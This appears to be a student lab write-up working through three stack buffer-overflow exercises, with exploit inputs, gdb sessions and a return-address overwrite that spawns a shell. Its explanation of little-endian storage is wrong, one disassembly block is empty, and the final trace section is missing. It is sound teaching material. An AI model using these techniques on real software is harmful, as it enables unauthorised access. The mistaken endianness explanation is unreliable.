## Exercise 1: Simple buffer overflow. Overwrite string
For this exercise we have to give an input to the program such that it executes `/bin/sh` instead of `/bin/ls`. By looking at the code we observe the following:
* `strcpy(buffer, argv[1]);` copies the first argument of the program into the variable `buffer[100]` without specifying the maximum number of bytes to be copied (in this case 100) implying the buffer can be overflowed
* we observe that the variable `command[10]` which contains the actual command that is run by the program is declared before the variable `buffer[100]`. This means that most likely the content of `command` will follow the content of the `buffer` in the stack.

Therefore, the stack would look like this:
```plaintext
+---------------------------+ higher addresses
| ...                       |
+---------------------------+
| return address            |
+---------------------------+ |
| base pointer              | | stack growth
+---------------------------+ |
| command[10]               | |
+---------------------------+ V
| alignment padding (maybe) |
+---------------------------+
|buffer[100]                |
+---------------------------+ lower addresses
```

It is now clear that we need to write at least 100 characters to overwrite the buffer and we need to check if there is any padding between the the buffer location and the command location. We do this by providing input longer than 100 and observe how the output is affected.

Turns out the padding is 2 bytes and an input that spawns a shell is:
```sh
./buffer $(perl -e 'print "a"x102 . "/bin/sh"')
```

## Exercise 2: bypass password verification with gdb

## I. The normal version
In this exercise we need to figure out what a program does without having the source code. We will use gdb for this, and the first step will be to mark the downloaded file as executable to be able to run it inside gdb: `chmod +x pwd-normal`

a) We start gdb, then load our program and start it in debugging mode using the following commands:
```sh
$gdb
...
(gdb) file pwd-normal
Reading symbols from pwd-normal...
(gdb) start
Temporary breakpoint 1 at 0x401c4e: file main.c, line 20.
```
Note that after the `start` command a temporary break point is set automatically at the beginning of the function `main`.

### Information gathering
* we can run the program (by writing `continue` inside gdb) and get a high level intuition about what it is doing. We are required a password and by introducing a random one, the program terminates with the message: Wrong password. (to run it again, write `start`)
* by restarting the program and running the command `(gdb) info variables` we find out that the main function contains 3 variables:
```C
buf = "`f@\000\000\000\000\000\000g@\000\000\000\000\000\000\000\000"
ok = 0
i = 4890648
```
We observe that `buf` is an array of 19 bytes. (\000 is 1 byte).
* we can now take a look inside the "main" function by typing `(gdb) disassemble main`. Depending on the preference, before running this command we could set the assembly style from att (default) to intel: `(gdb) set disassembly-flavor intel`. Here we can search for the `call` instructions to get information over the functions called from within `main`: printf, gets, sha256, hash_equals, puts.

### Disassemble main
Below we can see the disassembled code for the `main` function. The comments on the right side describe what the instructions accomplish. If you are not so familiar with assembly, you could use the `step` and `ni` command (see gdb documentation) to take one step at a time. Then you could immediately check the values of the local variables (`info locals`) and observe if any of them changed and try to see why. You could also set breakpoints in the code, then by pressing `continue` the execution will stop at that particular point. In order to set breakpoints we use the command `b *address`, where for this particular example the address is the long number that begins with 0x in front of an instruction (below it is omitted).
Another useful gdb command is `x/s address` which help us read strings from a specific memory location. For example, here we can see the location of the string "You're root!"

Useful assembly commands to look out for when figuring out control flow are the variants of "jump" (`j<condition>`, e.g. `jle`), which indicates that there is some branching logic, and `call` which are the function calls.

```

b) From line `<+4>`: in the disassembled `main`, we know that there were allocated 32 bytes for the stack. We also know that the buffer address is the same as the the stack pointer. What we also see is that the `ok` variable is situated next to the base pointer and it has 4 bytes (see line `<+8>` and `<+132>` ). Therefore we need $32-4+1=29$ characters to overwrite the variable `ok` with a non-zero value, such that the verification from line `<+132>` becomes true and the message `"You're root!"` is obtained. An input that bypasses the password is `aaaabbbbccccddddeeeeffffggggh`.

## II. The hard version
In the hard version of the exercise there is no information about the program variables. Therefore the command `info variables` does not offer anything. The approach for this version is to disassemble the `main` function just like before and analyze the assembly line by line. We can still see the function names and look into the memory for strings (with `x/s address`) which gives us an intuition of the program flow. Here, even if we do not have the variable names we can see that at the top of the stack (position `rbp-0x20`)there is a buffer of size 19 (see lines `<+22>` to `<+42>`) that is updated byte by byte. We can also see that depending on the value of the variable situated at the position `rbp-0x4` we become root or not (if the value is non zero). Following the same logic as before, we can deduce that a 29-byte input will get us to root.

## Exercise 3: who needs passwords anyway

We are given the following program:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// colour code magic
#define RED "\033[0;31m"
#define GREEN  "\033[0;32m"
#define NC  "\033[0m"

int check_passphrase(char* passphrase) {
    char buffer[100];
    strcpy(buffer, passphrase);
    if(strcmp(passphrase, "the magic words are squeamish ossifrage") == 0)
        return 1;
    return 0;
}

void launch_shell()
{
    printf(GREEN "Launching shell." NC "\n");
    system("/bin/bash");
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("Usage: %s <passphrase>\n", argv[0]);exit(0);
    }
    printf("* [DEBUG] Your input: %s\n", argv[1]);
    printf("* [DEBUG] The function launch_shell is at %p\n", launch_shell);

    if (check_passphrase(argv[1])) {
        launch_shell();
        exit(0);
    } else {
        fprintf(stderr,RED "Wrong password. This incident will be reported. ""https://xkcd.com/838/" NC "\n");
    }
    return 1;
}
```
which we compile using the given `Makefile`.

### Reviewing the source code.
We are very conveniently given the source code. Looking at this, we notice several interestings things:
- The `strcpy` function is used, just like `gets` this function does not perform any bounds checks, thus we have a buffer overflow.
- The buffer passed to `strcpy` is 100 bytes, so we need to give the program more than 100 bytes to overflow it.
- There is a function called `launch_shell` which gives us an interactive shell, this function is only called when the correct password is given.
- The program uses the first argument to take input, which is used a "passphrase".
- The program prints the location of `launch_shell`.

### Making a plan
The goal of the assignment is to get a shell without giving the correct password. Given the facts that we listed earlier, we can come up with a plan to accomplish this. First, lets think about how the stack looks when the buffer overflow occurs, so when `strcpy` is used.

The `check_passphrase` function has only one local variable: the buffer, which we know is a 100 bytes. Furthermore, we know that the stack stores the the `frame pointer` and the `return pointer`. The former points to the location of the variables of the function that called `check_passphrase` and the latter points to the code address where to continue after `check_passphrase` returns. In between the buffer and the frame pointer could be something, maybe padding for alignment, we don't know.

```
+---------------------------+ 0x7ffff...
|        0x55555......      | - Saved return pointer (8 bytes)
+---------------------------+
|        0x7ffff.......     | - Saved frame pointer (8 bytes)
+---------------------------+
|            ????           | - Unknown (x bytes)
+---------------------------+
| .... 0x41 0x41 0x41 0x41  |
| 0x41 0x41 0x41 0x41 0x41  |
| 0x41 0x41 0x41 0x41 0x41  |
| 0x41 0x41 0x41 0x41 0x41  | - Buffer (100 bytes)
| 0x41 0x41 0x41 0x41 0x41  |
| 0x41 0x41 0x41 0x41 0x41  |
+---------------------------+
```
Now ideally, we would overwrite the `return pointer`, because that controls where the program continues after `check_passphrase` ends. However, remember that the stack grows downwards, so how do we overwrite the return pointer, which is in a "higher" location than the buffer?

It is essential to remember that values are stored in `little-endian` representation. This means that if we have a buffer (char array) of 8 bytes which has the value AAAABBBB then this is stored as `\x42\x42\x42\x42\x41\x41\x41\x41`, where `\x41` is the byte representation for A and `\x42` is the byte representation for B respectively. **Thus it is stored in reverse order, so if we overflow the buffer then we don't write downwards, we write upwards and we can overwrite the return pointer.** Ultimately, by overwriting the return pointer we can redirect the program anywhere we want, ideally we want to get a shell and as it happens there is a function `launch_shell` which does exactly that.

To finally exploit the program, we only need to figure out two things:
- What is the address of `launch_shell`.
- How much input do we need to give the program to overflow the buffer and to reach the location of the `return pointer`.

### The exploit

#### Finding the address
Finding the address is actually really easy, since the program already prints the address. Don't forget to run the program without `ASLR` (address randomization) to get a "fixed" address of `launch_shell`:
```bash
setarch $(uname -m) -R ./functions aaa
```
This gives us as output
```
* [DEBUG] Your input: aaa
* [DEBUG] The function launch_shell is at 0x5555555548e4
Wrong password. This incident will be reported. https://xkcd.com/838/
```
So we know that `launch_shell` is at `0x5555555548e4`

#### Computing the offset to the return pointer
For this part we are going to use `GDB`, so that we can perfectly compute the offset, rather than just guessing. We start up GDB using
```
gdb functions
```
note that we do not need to use `setarch` since `GDB` disables `ASLR` by default. We can do
```
info functions
```
to get of list of the functions, no suprises here:
```
int check_passphrase(char *);
void launch_shell();
int main(int, char **);
```
The function that we are interested in is `check_passphrase`, since that is where the buffer overflow occurs. So we do
```
disas check_passphrase
```
where `disas` stands for disassemble to get the assembly code of `check_passphrase`
```
0x00000000000008a0 <+0>:	push   %rbp
0x00000000000008a1 <+1>:	mov    %rsp,%rbp
0x00000000000008a4 <+4>:	add    $0xffffffffffffff80,%rsp
0x00000000000008a8 <+8>:	mov    %rdi,-0x78(%rbp)
0x00000000000008ac <+12>:	mov    -0x78(%rbp),%rdx
0x00000000000008b0 <+16>:	lea    -0x70(%rbp),%rax
0x00000000000008b4 <+20>:	mov    %rdx,%rsi
0x00000000000008b7 <+23>:	mov    %rax,%rdi
0x00000000000008ba <+26>:	callq  0x6f0 <strcpy@plt>
0x00000000000008bf <+31>:	mov    -0x78(%rbp),%rax
0x00000000000008c3 <+35>:	lea    0x18e(%rip),%rsi        # 0xa58
0x00000000000008ca <+42>:	mov    %rax,%rdi
0x00000000000008cd <+45>:	callq  0x730 <strcmp@plt>
0x00000000000008d2 <+50>:	test   %eax,%eax
0x00000000000008d4 <+52>:	jne    0x8dd <check_passphrase+61>
0x00000000000008d6 <+54>:	mov    $0x1,%eax
0x00000000000008db <+59>:	jmp    0x8e2 <check_passphrase+66>
0x00000000000008dd <+61>:	mov    $0x0,%eax
0x00000000000008e2 <+66>:	leaveq
0x00000000000008e3 <+67>:	retq
```
We don't really have to look at the assembly, since we already have the source code. But we can use the information to set a breakpoint at the end of check_passphrase, since that is when the `return pointer` is used to determine where to jump to.
```
break *check_passphrase+67
```
Now we can run the program using
```
run aaa
```
which will run the program with `aaa` as input. The program now stops at our breakpoint:
```
Starting program: functions aaa
* [DEBUG] Your input: aaa
* [DEBUG] The function launch_shell is at 0x5555555548e4
Breakpoint 1, 0x00005555555548e3 in check_passphrase (passphrase=0x7fffffffe461 "aaa") at functions.c:16
16	}
```
Now we can look at the value of the return pointer using the command
```
info frame
```
This gives us the following output:
```
Stack level 0, frame at 0x7fffffffe060:
rip = 0x5555555548e3 in check_passphrase (functions.c:16); saved rip = 0x555555554987
called by frame at 0x7fffffffe080
source language c.
Arglist at 0x7fffffffe070, args: passphrase=0x7fffffffe461 "aaa"
Locals at 0x7fffffffe070, Previous frame's sp is 0x7fffffffe060
Saved registers:
rbp at 0x7fffffffe050, rip at 0x7fffffffe058
```
Nothing too interesting really, but that makes sense since our input was `aaa`, we did not overflow the buffer yet. Lets try another input (150 A's):
```
r $(perl -e 'print "A"x150')
```
and we do `info frame` again:
```
Stack level 0, frame at 0x7fffffffdfd0:
rip = 0x5555555548e3 in check_passphrase (functions.c:16); saved rip = 0x4141414141414141
called by frame at 0x7fffffffdfd8
source language c.
Arglist at 0x4141414141414141, args: passphrase=0x7fffffffe3d8 'A' <repeats 140 times>
Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffdfd0
Saved registers:
rbp at 0x7fffffffdfc0, rip at 0x7fffffffdfc8
```
As you can see, we have overwritten the frame pointer (arglist, locals) aswell as the return pointer (saved rip). If we continue the program using `continue` command we now get a `Segmentation fault`.

So we know that 150 A's is too much, but how many is enough to reach the `return pointer`? We know that the buffer is 100 bytes and the frame pointer is 8 bytes, so it has to be atleast 108 bytes. We can use a smart trick to hint us how many bytes we need exactly, instead of doing only A's we also do some B's, C's, etc:
```
r $(perl -e 'print "A"x108 . "BBBBCCCCDDDDEEEEFFFFGGGG"')
```
if we know run it and do `info frame` we get
```
Stack level 0, frame at 0x7fffffffdfe0:
rip = 0x5555555548e3 in check_passphrase (functions.c:16); saved rip = 0x4646464645454545
called by frame at 0x7fffffffdfe8
source language c.
Arglist at 0x4444444443434343, args: passphrase=0x7fffffffe3e0 'A' <repeats 108 times>, "BBBBCCCCDDDDEEEEFFFFGGGG"
Locals at 0x4444444443434343, Previous frame's sp is 0x7fffffffdfe0
Saved registers:
rbp at 0x7fffffffdfd0, rip at 0x7fffffffdfd8
```
So we have overwritten the return pointer to `0x4646464645454545`, which is `FFFFEEEE` so before reaching the return pointer we had 108 A's, 4 B's, 4 C's, 4 D's = 108 + 4 + 4 + 4 = 120 characters.

#### Running the exploit
Finally, we know both the address (`0x5555555548e4`) and the offset (`120`), so we can do the exploit:
```
setarch $(uname -m) -R ./functions $(perl -e 'print "A"x120 . "\xe4\x48\x55\x55\x55\x55"')
```
We supply the address in `little-endian` format, which is how all values, including pointers are stored. The program launches a shell:
```
* [DEBUG] Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�HUUUU
* [DEBUG] The function launch_shell is at 0x5555555548e4
Launching shell.
```



### A full gdb trace
We will use `gdb` to figure out how many bytes we need to write.
Carefully follow our steps (there are some comments inbetween) to see how we trace overwriting the return address.
The address of ``launch_shell`` is slightly different in this example, because it was written on a different computer.
